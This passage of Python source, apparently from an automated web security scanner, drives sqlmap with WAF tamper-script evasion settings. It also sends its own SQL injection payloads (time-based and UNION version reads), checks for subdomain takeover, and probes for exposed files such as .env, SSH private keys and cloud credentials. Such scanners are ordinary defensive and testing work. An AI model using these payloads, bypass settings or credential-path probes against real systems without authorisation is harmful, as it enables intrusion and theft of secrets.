        cookie_str, header_lines = get_auth_sqlmap_context(auth_session)
        existing_headers_lower = {h.split(":")[0].lower() for h in lines if ":" in h}

        if cookie_str and "cookie" not in existing_headers_lower:
            lines.append(f"Cookie: {cookie_str}")

        for hl in header_lines:
            header_name = hl.split(":")[0].lower() if ":" in hl else ""
            if header_name and header_name not in existing_headers_lower:
                lines.append(hl)

    lines.append("")  # Empty line before body

    if post_data:
        lines.append(post_data)

    # Write to temp file
    try:
        fd, path = tempfile.mkstemp(prefix="sqlmap_req_", suffix=".txt")
        with os.fdopen(fd, "w") as f:
            f.write("\r\n".join(lines))
        return path
    except Exception:
        return None


async def sqlmap_test_request_file(
    request_file: str,
    quick_mode: bool = False,
    aggressive: bool = False,
    param: str | None = None,
    dbms: str | None = None,
) -> dict:
    """Run SQLmap using a request file (-r option).

    Args:
        request_file: Path to the request file
        quick_mode: Use quick scanning mode
        aggressive: Use aggressive scanning mode
        param: Specific parameter to test
        dbms: Detected DBMS for tuning

    Returns:
        Dict with scan results
    """
    cmd = ["sqlmap", "-r", request_file, "--batch", "--random-agent", "--answers=Y"]

    if param:
        cmd.extend(["-p", param])

    # Apply DBMS-specific configuration
    dbms_config = DBMS_SQLMAP_CONFIG.get(dbms.lower()) if dbms else None
    if dbms_config:
        cmd.extend(["--dbms", dbms_config["dbms"]])
        if dbms_config.get("extra_args"):
            cmd.extend(dbms_config["extra_args"])

    # Mode-specific flags
    if quick_mode:
        cmd.extend(["--level=1", "--risk=1", "--smart", "--threads=2", "--timeout=10"])
        timeout = 120
    elif aggressive:
        technique = dbms_config["technique"] if dbms_config else "BEUSTQ"
        cmd.extend([
            "--level=5", "--risk=3",
            "--threads=4", "--timeout=60",
            f"--technique={technique}",
        ])
        timeout = 600
    else:
        technique = dbms_config["technique"] if dbms_config else "BEUST"
        cmd.extend(["--level=3", "--risk=2", "--threads=4", "--timeout=30", f"--technique={technique}"])
        timeout = 300

    out, err, rc = await run(cmd, timeout=timeout)

    # Clean up temp file
    try:
        os.unlink(request_file)
    except Exception:
        pass

    scan_completed = rc == 0
    vulnerable = "is vulnerable" in (out or "").lower()

    return {
        "scan_completed": scan_completed,
        "vulnerable": vulnerable,
        "summary": "possible SQLi" if vulnerable else "no clear evidence",
        "error": (err or "")[:500] if rc != 0 else None,
        "raw": (out or err or "")[-1200:],
    }


async def sqlmap_replay_request(
    captured_request: dict[str, Any],
    auth_session: Any | None = None,
    quick_mode: bool = False,
    aggressive: bool = False,
    param: str | None = None,
    dbms: str | None = None,
) -> dict | None:
    """Run SQLmap using a captured Playwright request with real headers/body.

    Args:
        captured_request: Dict with url, method, headers, post_data from Playwright capture
        auth_session: Optional auth session to merge additional cookies/headers
        quick_mode: Use quick scanning mode
        aggressive: Use aggressive scanning mode
        param: Specific parameter to test
        dbms: Detected DBMS for tuning

    Returns:
        Dict with scan results, or None if request file couldn't be created.
    """
    url = captured_request.get("url", "")
    method = captured_request.get("method", "GET")

    # Auth health gate - same as non-replay path
    auth_valid, auth_skip_reason = await _verify_auth_before_sqlmap(
        auth_session, url, method=method
    )
    if not auth_valid:
        return {
            "url": url,
            "method": method,
            "skipped": True,
            "skip_reason": auth_skip_reason,
            "skip_details": "auth check failed before replay",
            "replay": True,
            "replay_source": "playwright",
        }

    req_file = _write_sqlmap_request_file(captured_request, auth_session)
    if not req_file:
        return None
    result = await sqlmap_test_request_file(req_file, quick_mode, aggressive, param, dbms)
    result["replay"] = True
    result["replay_source"] = "playwright"
    return result


# DBMS-specific SQLmap configuration for optimized detection
DBMS_SQLMAP_CONFIG = {
    "sqlite": {
        "dbms": "SQLite",
        "technique": "BEUST",
        "tamper": ["space2comment"],
        "extra_args": ["--prefix=\"'))\"", "--suffix=\"--\""],
    },
    "mysql": {
        "dbms": "MySQL",
        "technique": "BEUST",
        "tamper": ["space2comment", "between"],
        "extra_args": [],
    },
    "postgresql": {
        "dbms": "PostgreSQL",
        "technique": "BEUST",
        "tamper": [],
        "extra_args": [],
    },
    "mssql": {
        "dbms": "Microsoft SQL Server",
        "technique": "BEUSTQ",
        "tamper": ["space2comment"],
        "extra_args": [],
    },
    "oracle": {
        "dbms": "Oracle",
        "technique": "BEUST",
        "tamper": [],
        "extra_args": [],
    },
}

# WAF-specific tamper script configuration for SQLmap
# Selected based on known bypass techniques for each WAF vendor
WAF_TAMPER_CONFIG = {
    "cloudflare": {
        "tamper": ["space2comment", "randomcase", "between", "charencode"],
        "extra_args": ["--skip-waf"],
        "delay": 0.5,  # Cloudflare rate limiting
    },
    "akamai": {
        "tamper": ["randomcase", "space2hash", "versionedmorekeywords", "charencode"],
        "extra_args": ["--skip-waf"],
        "delay": 1.0,  # Akamai aggressive rate limiting
    },
    "aws_waf": {
        "tamper": ["space2comment", "charencode", "between", "randomcase"],
        "extra_args": ["--skip-waf"],
        "delay": 0.3,
    },
    "modsecurity": {
        "tamper": ["charencode", "apostrophemask", "space2plus", "percentage", "modsecurityversioned"],
        "extra_args": ["--skip-waf"],
        "delay": 0.2,
    },
    "f5_bigip": {
        "tamper": ["space2comment", "randomcase", "charencode", "between"],
        "extra_args": ["--skip-waf"],
        "delay": 0.5,
    },
    "sucuri": {
        "tamper": ["space2comment", "randomcase", "charencode", "between", "apostrophemask"],
        "extra_args": ["--skip-waf"],
        "delay": 0.5,
    },
    "incapsula": {
        "tamper": ["randomcase", "space2comment", "charencode", "appendnullbyte"],
        "extra_args": ["--skip-waf"],
        "delay": 0.8,
    },
    "barracuda": {
        "tamper": ["space2plus", "randomcase", "charencode", "between"],
        "extra_args": ["--skip-waf"],
        "delay": 0.5,
    },
    "fortinet": {
        "tamper": ["space2comment", "randomcase", "charencode"],
        "extra_args": ["--skip-waf"],
        "delay": 0.5,
    },
}


def get_waf_tamper_scripts(waf_products: list[str], dbms_tamper: list[str] | None = None) -> tuple[list[str], float]:
    """
    Get optimal tamper scripts based on detected WAF products.

    Combines WAF-specific and DBMS-specific tamper scripts, avoiding duplicates.
    Returns (tamper_scripts, recommended_delay).
    """
    if not waf_products:
        return dbms_tamper or [], 0.0

    # Start with DBMS-specific tampers
    tamper_set = set(dbms_tamper or [])
    max_delay = 0.0

    # Add WAF-specific tampers
    for waf in waf_products:
        waf_lower = waf.lower()
        if waf_lower in WAF_TAMPER_CONFIG:
            config = WAF_TAMPER_CONFIG[waf_lower]
            tamper_set.update(config.get("tamper", []))
            max_delay = max(max_delay, config.get("delay", 0.0))

    # Prioritize most effective tampers first
    priority_order = [
        "space2comment", "charencode", "randomcase", "between",
        "apostrophemask", "space2plus", "percentage", "modsecurityversioned",
        "versionedmorekeywords", "space2hash", "appendnullbyte"
    ]

    ordered_tampers = []
    for tamper in priority_order:
        if tamper in tamper_set:
            ordered_tampers.append(tamper)
            tamper_set.remove(tamper)

    # Add remaining tampers
    ordered_tampers.extend(sorted(tamper_set))

    return ordered_tampers, max_delay


async def sqlmap_test(
    url: str,
    quick_mode: bool = False,
    aggressive: bool = False,
    method: str | None = None,
    data: str | None = None,
    headers: list[str] | None = None,
    cookie: str | None = None,
    auth_session: Any | None = None,
    param: str | None = None,
    dbms: str | None = None,
    waf_products: list[str] | None = None,
) -> dict:
    """Run SQLmap SQL injection scanner with DBMS-aware and WAF-aware tuning.

    Args:
        url: Target URL to test
        quick_mode: Use fast, lightweight scanning
        aggressive: Use aggressive settings with higher level/risk
        method: HTTP method (GET, POST, etc.)
        data: POST data
        headers: Additional headers
        cookie: Cookie string
        auth_session: Authentication session
        param: Specific parameter to test
        dbms: Detected DBMS type (sqlite, mysql, postgresql, mssql, oracle)
        waf_products: List of detected WAF products (cloudflare, akamai, etc.)

    Returns:
        Dict with scan results and execution status.
    """
    cmd = ["sqlmap", "-u", url, "--batch", "--random-agent", "--answers=Y"]
    if method:
        cmd.extend(["--method", method])
    if data is not None:
        cmd.extend(["--data", data])
    if param:
        cmd.extend(["-p", param])

    # Apply DBMS-specific configuration when detected
    dbms_config = DBMS_SQLMAP_CONFIG.get(dbms.lower()) if dbms else None
    if dbms_config:
        cmd.extend(["--dbms", dbms_config["dbms"]])
        if dbms_config.get("extra_args"):
            cmd.extend(dbms_config["extra_args"])

    # Get WAF-aware tamper scripts, combining with DBMS-specific ones
    dbms_tamper = dbms_config.get("tamper", []) if dbms_config else []
    waf_tamper, waf_delay = get_waf_tamper_scripts(waf_products or [], dbms_tamper)

    # Add WAF-specific extra args (like --skip-waf)
    if waf_products:
        for waf in waf_products:
            waf_lower = waf.lower()
            if waf_lower in WAF_TAMPER_CONFIG:
                waf_extra = WAF_TAMPER_CONFIG[waf_lower].get("extra_args", [])
                for arg in waf_extra:
                    if arg not in cmd:
                        cmd.append(arg)

    cookie_str, header_lines = get_auth_sqlmap_context(auth_session)
    header_lines.extend(headers or [])
    header_lines = _dedupe_header_lines(header_lines)

    cookies = [c for c in [cookie_str, cookie] if c]
    if cookies:
        cmd.extend(["--cookie", "; ".join(cookies)])
    if header_lines:
        cmd.extend(["--headers", "\n".join(header_lines)])
    if quick_mode:
        cmd.extend(["--level=1", "--risk=1", "--smart", "--threads=2", "--timeout=10", "--retries=1", "--technique=EU"])
        timeout = 120
    elif aggressive:
        # Aggressive mode: higher level/risk, all techniques
        technique = dbms_config["technique"] if dbms_config else "BEUSTQ"
        # Use WAF-aware tamper scripts if WAF detected, otherwise DBMS tampers
        tamper_scripts = waf_tamper if waf_tamper else (dbms_config.get("tamper", ["space2comment", "between"]) if dbms_config else ["space2comment", "between"])
        cmd.extend([
            "--level=5", "--risk=3",
            "--threads=4", "--timeout=60", "--retries=3",
            f"--technique={technique}",
        ])
        if tamper_scripts:
            cmd.extend([f"--tamper={','.join(tamper_scripts)}"])
        # Add delay for WAF rate limiting bypass
        if waf_delay > 0:
            cmd.extend([f"--delay={waf_delay}"])
        # Only add prefix/suffix if not already set by DBMS config
        if not dbms_config or not dbms_config.get("extra_args"):
            cmd.extend(["--prefix=\"'))\"", "--suffix=\"--\""])
        timeout = 600  # 10 minutes for aggressive
    else:
        technique = dbms_config["technique"] if dbms_config else "BEUST"
        cmd.extend(["--level=3", "--risk=2", "--threads=4", "--timeout=30", "--retries=2", f"--technique={technique}"])
        # Use WAF-aware tamper scripts if WAF detected
        tamper_scripts = waf_tamper if waf_tamper else (dbms_config.get("tamper", []) if dbms_config else [])
        if tamper_scripts:
            cmd.extend([f"--tamper={','.join(tamper_scripts)}"])
        # Add delay for WAF rate limiting bypass
        if waf_delay > 0:
            cmd.extend([f"--delay={waf_delay}"])
        timeout = 300
    out, err, rc = await run(cmd, timeout=timeout)
    scan_completed = rc == 0  # Tool executed successfully
    vulnerable = "is vulnerable" in (out or "").lower()
    error = None
    if rc != 0:
        error = (err or "Unknown error")[:500] if err else f"Exit code {rc}"

    # Only report WAF bypass fields if tamper/delay were actually applied
    # Quick mode never applies tamper scripts, so don't report them as used
    actually_applied_tamper = [] if quick_mode else (waf_tamper if waf_tamper else (tamper_scripts if 'tamper_scripts' in dir() else []))
    waf_bypass_was_applied = bool(waf_products and waf_tamper and not quick_mode)

    return {
        "scan_completed": scan_completed,
        "vulnerable": vulnerable,
        "summary": "possible SQLi" if vulnerable else "no clear evidence",
        "error": error,
        "raw": (out or err or "")[-1200:],
        "waf_bypass_applied": waf_bypass_was_applied,
        "tamper_scripts_used": actually_applied_tamper,
    }


_SQLMAP_PRIORITY_PARAMS = ["id", "user", "uid", "account", "login", "query", "search", "filter"]


def _pick_priority_param(params: list[str]) -> str | None:
    for param in params:
        if any(sp in param.lower() for sp in _SQLMAP_PRIORITY_PARAMS):
            return param
    return params[0] if params else None


async def sqlmap_test_context(
    endpoint: dict[str, Any],
    quick_mode: bool = False,
    aggressive: bool = False,
    auth_session: Any | None = None,
    param: str | None = None,
    dbms: str | None = None,
    waf_products: list[str] | None = None,
) -> dict:
    """Run sqlmap with full request context from an endpoint definition.

    Args:
        endpoint: Endpoint definition with url, method, params, etc.
        quick_mode: Use fast, lightweight scanning
        aggressive: Use aggressive settings with higher level/risk
        auth_session: Authentication session
        param: Specific parameter to test
        dbms: Detected DBMS type (sqlite, mysql, postgresql, mssql, oracle)
        waf_products: List of detected WAF products (cloudflare, akamai, etc.)

    Returns:
        Dict with scan results.
    """
    url = endpoint.get("url", "")

    # Resolve path parameters like {id} or :id
    if "{" in url or re.search(r"/:[^/?#]+", url):
        url = _resolve_path_params(url)
        # Check if still has unresolved params
        if "{" in url:
            unresolved = re.findall(r"\{[^}]+\}", url)
            return {
                "url": url,
                "method": endpoint.get("method", "GET").upper(),
                "param": param,
                "scan_completed": False,
                "skipped": True,
                "skip_reason": "path_param_unresolved",
                "skip_details": f"Unresolved: {unresolved}",
            }

    method = endpoint.get("method", "GET").upper()

    # Auth health gate: verify auth before wasting time on SQLmap
    if auth_session:
        auth_valid, auth_skip_reason = await _verify_auth_before_sqlmap(auth_session, url, method=method)
        if not auth_valid:
            return {
                "url": url,
                "method": method,
                "param": param,
                "scan_completed": False,
                "skipped": True,
                "skip_reason": auth_skip_reason,
            }

    allowed = endpoint.get("allowed_methods")
    if allowed and method not in [m.upper() for m in allowed]:
        return {
            "url": url,
            "method": method,
            "param": param,
            "scan_completed": False,
            "skipped": True,
            "skip_reason": "method_not_allowed",
            "skip_details": f"Allowed: {allowed}",
        }
    content_type = endpoint.get("content_type") or "application/json"
    params = endpoint.get("params", []) or endpoint.get("query_params", [])
    body_params = endpoint.get("body_params", [])
    param_defaults = endpoint.get("param_defaults") or endpoint.get("query_param_defaults") or {}

    target_param = param or _pick_priority_param(body_params if method != "GET" else params)
    if method == "GET":
        if not params:
            return {"url": url, "method": method, "param": target_param, "scan_completed": False, "skipped": True, "skip_reason": "no_params"}
        if param_defaults:
            parsed = urllib.parse.urlparse(url)
            existing = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
            for name, value in param_defaults.items():
                existing.setdefault(name, _stringify_body_value(value))
            updated_query = urllib.parse.urlencode(existing, doseq=True)
            url = urllib.parse.urlunparse(parsed._replace(query=updated_query))
        result = await sqlmap_test(
            url,
            quick_mode=quick_mode,
            aggressive=aggressive,
            auth_session=auth_session,
            param=target_param,
            dbms=dbms,
            waf_products=waf_products,
        )
        result.update({"url": url, "method": method, "param": target_param})
        return result

    if not body_params:
        return {"url": url, "method": method, "param": target_param, "scan_completed": False, "skipped": True, "skip_reason": "no_body_params"}
    if "multipart/form-data" in content_type:
        return {"url": url, "method": method, "param": target_param, "scan_completed": False, "skipped": True, "skip_reason": "multipart_not_supported"}

    body = _build_body_template(endpoint, target_param)
    if not body:
        return {"url": url, "method": method, "param": target_param, "scan_completed": False, "skipped": True, "skip_reason": "empty_body"}

    data = _encode_body_string(body, content_type)
    headers = [f"Content-Type: {content_type}"]
    result = await sqlmap_test(
        url,
        quick_mode=quick_mode,
        aggressive=aggressive,
        method=method,
        data=data,
        headers=headers,
        auth_session=auth_session,
        param=target_param,
        dbms=dbms,
        waf_products=waf_products,
    )
    result.update({"url": url, "method": method, "param": target_param})
    return result


async def custom_sqli_test(url: str) -> dict:
    """
    DBMS-aware SQL injection detection with reflection-safe response analysis.

    Detection is delegated to the shared ``_check_sqli_response`` engine (the same
    one the smart scan uses), so a finding is only raised on a high-confidence,
    low-false-positive signal: a real database error fingerprint, a confirmed
    time-based delay, an out-of-baseline version/banner read, or a server crash.
    A reflected payload keyword (e.g. an echoed ``information_schema`` string) is
    no longer treated as proof. Payloads cover MySQL, PostgreSQL, MSSQL, Oracle
    and SQLite.
    """
    findings: list[dict[str, Any]] = []
    tested = 0

    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    if not query_params:
        return {"findings": [], "tested": 0, "vulnerable": False, "scan_completed": True}

    # Cross-DBMS payloads. Technique labels are chosen so ``_check_sqli_response``
    # routes each one to the right detector (it substring-matches on
    # error/time/version/schema/user/database). Database errors are fingerprinted
    # for every payload regardless of label.
    sqli_payloads: list[tuple[str, str]] = [
        # Error-based: break the query and rely on the DB error fingerprint (all DBMS)
        ("'", "error_single_quote"),
        ("')", "error_paren_quote"),
        ("\"", "error_double_quote"),
        ("1' ORDER BY 9999-- -", "error_orderby_overflow"),
        # Time-based blind, per major DBMS (confirmed with a re-test before reporting)
        ("' AND SLEEP(2)-- -", "time_mysql"),
        ("' AND (SELECT 1 FROM (SELECT SLEEP(2))a)-- -", "time_mysql_subquery"),
        ("'; SELECT pg_sleep(2)-- ", "time_postgresql"),
        ("' AND 1=(SELECT 1 FROM PG_SLEEP(2))-- ", "time_postgresql_inline"),
        ("'; WAITFOR DELAY '0:0:2'-- ", "time_mssql"),
        ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',2)-- ", "time_oracle"),
        # Version/banner read (proof of injection); reflection-guarded
        ("' UNION SELECT NULL,@@version,NULL-- -", "version_mysql_mssql"),
        ("' UNION SELECT NULL,version(),NULL-- ", "version_postgresql"),
        ("' UNION SELECT NULL,banner,NULL FROM v$version WHERE ROWNUM=1-- ", "version_oracle"),
        ("')) UNION SELECT 1,sqlite_version(),3,4,5,6,7,8,9 FROM sqlite_master-- ", "version_sqlite"),
    ]

    # Only these evidence categories are trustworthy enough to raise a finding
    # from an unauthenticated, unverified full scan. Boolean/size-only deltas are
    # intentionally treated as too weak to report here to avoid false positives.
    strong_evidence_markers = (
        "SQL error detected",
        "Time-based delay",
        "Data extraction indicator",
        "Server crash indicator",
    )

    async def get_response(test_url: str) -> tuple[str, int, float]:
        """Fetch URL and return (body, status_code, response_time)."""
        start = time.time()
        out, _, rc = await run([
            "curl", "-sS", "-L", "-k", "--max-time", "10",
            "-w", "\n%{http_code}",
            "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            test_url
        ], timeout=15)
        elapsed = time.time() - start

        if rc != 0 or not out:
            return "", 0, elapsed

        lines = out.rsplit("\n", 1)
        body = lines[0] if len(lines) > 1 else out
        try:
            status = int(lines[-1]) if len(lines) > 1 and lines[-1].isdigit() else 200
        except ValueError:
            status = 200
        return body, status, elapsed

    async def _evaluate(
        param_name: str, original_value: str, payload: str, payload_type: str,
        baseline_body: str, baseline_len: int, baseline_status: int, baseline_time: float,
        reflected: bool = False,
    ) -> tuple[str, str, bool, list[str]]:
        """Inject one payload and run it through the shared SQLi response engine."""
        nonlocal tested
        test_params = {k: list(v) for k, v in query_params.items()}
        test_params[param_name] = [original_value + payload]
        test_query = urllib.parse.urlencode(test_params, doseq=True)
        test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))

        test_body, test_status, test_time = await get_response(test_url)
        tested += 1

        is_vuln, evidence = _check_sqli_response(
            test_body, baseline_len, test_time, payload_type,
            dbms_detected=None, status_code=test_status,
            baseline_status=baseline_status, baseline_elapsed=baseline_time,
            baseline_body=baseline_body, payload=payload, reflected=reflected,
        )
        return test_url, test_body, is_vuln, evidence

    async def _param_reflects(param_name: str, original_value: str) -> bool:
        """Probe whether the parameter echoes arbitrary input into the response."""
        canary = "zqSqli12345cx"
        probe_params = {k: list(v) for k, v in query_params.items()}
        probe_params[param_name] = [original_value + canary]
        probe_query = urllib.parse.urlencode(probe_params, doseq=True)
        probe_url = urllib.parse.urlunparse(parsed._replace(query=probe_query))
        probe_body, _, _ = await get_response(probe_url)
        return bool(probe_body and canary in probe_body)

    for param_name in query_params:
        original_value = query_params[param_name][0] if query_params[param_name] else "test"

        baseline_body, baseline_status, baseline_time = await get_response(url)
        baseline_len = len(baseline_body)
        param_reflected = await _param_reflects(param_name, original_value)

        for payload, payload_type in sqli_payloads:
            test_url, test_body, is_vuln, evidence = await _evaluate(
                param_name, original_value, payload, payload_type,
                baseline_body, baseline_len, baseline_status, baseline_time,
                reflected=param_reflected,
            )
            if not is_vuln:
                continue

            strong = [e for e in evidence if any(m in e for m in strong_evidence_markers)]
            if not strong:
                continue  # weak/ambiguous signal only — skip to avoid false positives

            # Confirm a purely time-based hit with a second request to rule out
            # network jitter before reporting it.
            if "time" in payload_type and all("Time-based delay" in e for e in strong):
                _, _, confirm_vuln, confirm_ev = await _evaluate(
                    param_name, original_value, payload, payload_type,
                    baseline_body, baseline_len, baseline_status, baseline_time,
                )
                if not (confirm_vuln and any("Time-based delay" in e for e in confirm_ev)):
                    continue

            severity = "critical" if any("Data extraction indicator" in e for e in strong) else "high"
            findings.append({
                "type": "SQL Injection",
                "url": test_url,
                "parameter": param_name,
                "payload": payload,
                "payload_type": payload_type,
                "evidence": strong,
                "severity": severity,
                "baseline_length": baseline_len,
                "response_length": len(test_body),
            })
            break  # one confirmed SQLi per parameter is enough

    return {
        "findings": findings,
        "tested": tested,
        "vulnerable": len(findings) > 0,
        "scan_completed": True,
    }


async def check_subdomain_takeover(host: str) -> dict[str, Any]:
    results: dict[str, Any] = {"vulnerable": False, "cname": None, "issues": []}
    out, err, rc = await run(["dig", "+short", "+tries=1", "+time=2", host, "CNAME"])
    if rc == 0 and out:
        lines = [l.strip() for l in out.splitlines() if l.strip() and not l.startswith(";;") and "communications error" not in l]
        cname = lines[0].rstrip(".") if lines else None
        results["cname"] = cname
        vulnerable_services = [("amazonaws.com", "NoSuchBucket"), ("azurewebsites.net", "404 Web Site not found"), ("cloudfront.net", "Bad Request"), ("github.io", "There isn't a GitHub Pages site here"), ("herokuapp.com", "no-such-app"), ("shopify.com", "Sorry, this shop is currently unavailable"), ("tumblr.com", "Not found"), ("wordpress.com", "Do you want to register")]
        for service, fingerprint in vulnerable_services:
            if cname and service in cname:
                curl_out, _, _ = await run(["curl", "-sS", "-L", "-k", "--max-time", "10", f"https://{host}"])
                if fingerprint in (curl_out or ""):
                    results["vulnerable"] = True
                    results["issues"].append(f"Potential takeover via {service}")
    return results


def _collapse_duplicate_exposed_file_entries(exposed: list[dict[str, Any]]) -> list[dict[str, Any]]:
    """Collapse identical exposed-file bodies into one finding with alternate paths."""
    groups: dict[tuple[str, tuple[str, ...]], list[dict[str, Any]]] = {}
    passthrough: list[dict[str, Any]] = []

    for entry in exposed:
        fingerprint = entry.get("preview_hash16")
        if not fingerprint or entry.get("group"):
            passthrough.append(entry)
            continue
        markers = tuple(sorted(str(marker) for marker in (entry.get("markers") or []) if marker))
        groups.setdefault((str(fingerprint), markers), []).append(entry)

    confidence_rank = {"high": 0, "medium": 1, "low": 2}

    def entry_sort_key(entry: dict[str, Any]) -> tuple[int, int, str]:
        path = str(entry.get("path") or "")
        confidence = str(entry.get("confidence") or "low").lower()
        return (confidence_rank.get(confidence, 3), len(path), path)

    collapsed: list[dict[str, Any]] = []
    for entries in groups.values():
        if len(entries) == 1:
            collapsed.append(entries[0])
            continue

        ordered = sorted(entries, key=entry_sort_key)
        representative = dict(ordered[0])
        representative["duplicate_count"] = len(ordered) - 1
        representative["duplicate_paths"] = [entry.get("path") for entry in ordered[1:] if entry.get("path")]
        representative["subentries"] = [
            {
                "path": entry.get("path"),
                "url": entry.get("url"),
                "content_type": entry.get("content_type"),
                "confidence": entry.get("confidence"),
                "preview_hash16": entry.get("preview_hash16"),
                "preview_first_line": entry.get("preview_first_line"),
                "has_html": entry.get("has_html"),
            }
            for entry in ordered
        ]
        collapsed.append(representative)

    return collapsed + passthrough


async def check_exposed_files(base_url: str, quick_mode: bool = False) -> dict[str, Any]:
    import hashlib
    exposed: list[dict[str, Any]] = []
    high_priority_paths = [
        ".git/config", ".git/HEAD", ".git/index", ".git/logs/HEAD", ".svn/entries", ".svn/wc.db", ".hg/store/undo", ".bzr/branch/branch.conf",
        ".env", ".env.local", ".env.production", ".env.development", ".env.staging", ".env.test", ".env.backup", ".env.old", ".env.save", ".env.bak", ".env.example", ".env.sample",
        "database.yml", "database.yaml", "database.json", "db.yml", "db.yaml", "db.json",
        # Private keys and SSH
        "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", ".ssh/id_rsa", ".ssh/id_dsa", ".ssh/id_ecdsa", ".ssh/id_ed25519",
        "server.key", "privatekey.pem", "private.key", "ssl.key", "cert.key", "certificate.key", "key.pem", "privkey.pem",
        # Cloud credentials
        ".aws/credentials", ".aws/config", ".kube/config", "gcloud.json", "application_default_credentials.json", "service-account.json", "serviceAccount.json", "credentials.json",
        "backup.sql", "dump.sql", "database.sql", "db.sql", "mysql.sql", "postgres.sql", "data.sql",
        "wp-config.php", "wp-config.php.bak", "wp-config.old", "configuration.php", "LocalSettings.php",
        "settings.py", "local_settings.py", "config.inc.php", "database.inc.php", "db.inc.php",
        # Language/toolchain auth files
        ".npmrc", ".pypirc", ".gem/credentials", "auth.json",
        ".well-known/security.txt",
    ]
    medium_priority_paths = [
        "config.json", "config.yml", "config.yaml", "config.xml", "settings.json", "appsettings.json", "appsettings.Development.json", "parameters.yml", "parameters.ini", "secrets.yml", "credentials.yml",
        ".aws/credentials", ".aws/config", "aws.json", "azureProfile.json", "azure.json", "gcloud.json", "application_default_credentials.json",
        ".gitlab-ci.yml", ".github/workflows/deploy.yml", ".travis.yml", "Jenkinsfile", "bitbucket-pipelines.yml", "azure-pipelines.yml", "circle.yml", ".drone.yml",
        "Dockerfile", "docker-compose.yml", "docker-compose.yaml", "kubernetes.yml", "k8s.yml", "helm/values.yaml",
        "package.json", "package-lock.json", "yarn.lock", "composer.json", "composer.lock", "Gemfile", "Gemfile.lock", "requirements.txt", "Pipfile", "Pipfile.lock",
        "Makefile", "build.gradle", "pom.xml", "build.xml",
        "swagger.json", "swagger.yaml", "openapi.json", "openapi.yaml", "api-docs.json", "postman_collection.json",
        "backup.tar.gz", "backup.zip", "site.zip", "www.zip", "backup.tar", "backup.rar", "database.zip",
        ".htaccess", ".htpasswd", "web.config", "nginx.conf", "apache.conf", "httpd.conf", "php.ini", ".user.ini",
    ]
    low_priority_paths = [
        ".vscode/settings.json", ".idea/workspace.xml", ".project", "nbproject/project.xml",
        "debug.log", "error.log", "access.log", "production.log", "laravel.log", "app.log",
        "phpinfo.php", "info.php", "test.php", "i.php", "robots.txt", "sitemap.xml", "crossdomain.xml",
        "README.md", "readme.txt", "INSTALL.txt", "CHANGELOG.md", "TODO.txt",
        "config.php.bak", "index.php.old", "backup.old", ".DS_Store", "Thumbs.db", "desktop.ini",
        "test.html", "test.php", "example.html", "sample.txt", "demo.html",
    ]
    sensitive_paths = high_priority_paths[:30] if quick_mode else high_priority_paths + medium_priority_paths + low_priority_paths[:20]
    async def test_canary():
        """Test random non-existent paths to fingerprint error responses and detect catch-all servers."""
        rand_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        canary_paths = [f"/definitely-not-real-{rand_suffix}.txt", f"/.git/fake-file-{rand_suffix}", f"/test-{rand_suffix}/.env", f"/random-{rand_suffix}/config.php"]
        canary_responses: list[dict[str, Any]] = []
        for canary in canary_paths:
            full_url = urllib.parse.urljoin(base_url, canary)
            content_out, _, content_rc = await run(["curl", "-sS", "-L", "-k", "--max-time", "3", "--max-filesize", "100000", "-H", "User-Agent: Mozilla/5.0", full_url])
            headers_with_body, _, _ = await run(["curl", "-sS", "-i", "-L", "-k", "--max-time", "3", "--max-filesize", "100000", "-H", "User-Agent: Mozilla/5.0", full_url])
            if content_rc == 0 and content_out and headers_with_body:
                first_line = headers_with_body.splitlines()[0] if headers_with_body else ""
                # Extract status code from response
                status_code = "unknown"
                if first_line:
                    parts = first_line.split()
                    if len(parts) >= 2:
                        status_code = parts[1]
                content_hash = hashlib.sha256(content_out.encode('utf-8', errors='ignore')).hexdigest()[:16]
                # Record ALL responses regardless of status code
                canary_responses.append({
                    "path": canary,
                    "status": status_code,
                    "content_hash": content_hash,
                    "content_length": len(content_out),
                    "content_sample": content_out[:500]
                })
        # Detect catch-all servers: if all canary paths return identical content, server returns same response for everything
        catch_all = False
        catch_all_fingerprint = None
        if len(canary_responses) >= 2:
            unique_hashes = set(c["content_hash"] for c in canary_responses)
            if len(unique_hashes) == 1:
                # All random paths return identical content = catch-all server
                catch_all = True
                catch_all_fingerprint = canary_responses[0]
        return {"catch_all": catch_all, "fingerprint": catch_all_fingerprint, "responses": canary_responses}
    def extract_header(headers: str, header_name: str):
        if not headers:
            return None
        for line in headers.splitlines():
            if header_name.lower() in line.lower():
                parts = line.split(":", 1)
                if len(parts) == 2:
                    return parts[1].strip()
        return None
    def create_fingerprint(content: str, headers: str):
        content_bytes = content.encode('utf-8', errors='ignore') if isinstance(content, str) else content
        return {
            "hash": hashlib.sha256(content_bytes).hexdigest()[:16],
            "length": len(content),
            "has_html": b"<html" in content_bytes.lower() or b"<!doctype" in content_bytes.lower(),
            "content_type": extract_header(headers, "content-type"),
            "first_line": content.splitlines()[0][:100] if content else "",
        }
    # Marker/validator helpers shared with the retest prover live in
    # exposure_markers (imported at module top): guess_confidence,
    # derive_markers, SOFT_404_PATTERNS, CRITICAL_FILE_VALIDATORS.

    async def check_path_smart(path: str, canary_fps: list[dict[str, Any]], canary_result: dict[str, Any]):
        full_url = urllib.parse.urljoin(base_url, path)
        headers_out, _, headers_rc = await run(["curl", "-sS", "-I", "-L", "-k", "--max-time", "5", "-H", "User-Agent: Mozilla/5.0", full_url])
        head_success = False
        if headers_rc == 0 and headers_out:
            first_line = headers_out.splitlines()[0] if headers_out else ""
            if "200" in first_line:
                head_success = True
        content_out, _, content_rc = await run(["curl", "-sS", "-L", "-k", "--max-time", "5", "--max-filesize", "100000", "-H", "User-Agent: Mozilla/5.0", full_url])
        if content_rc != 0 or not content_out:
            return None
        if not head_success:
            headers_with_body, _, _ = await run(["curl", "-sS", "-i", "-L", "-k", "--max-time", "5", "--max-filesize", "100000", "-H", "User-Agent: Mozilla/5.0", full_url])
            if headers_with_body:
                first_line = headers_with_body.splitlines()[0] if headers_with_body else ""
                if "200" not in first_line:
                    return None
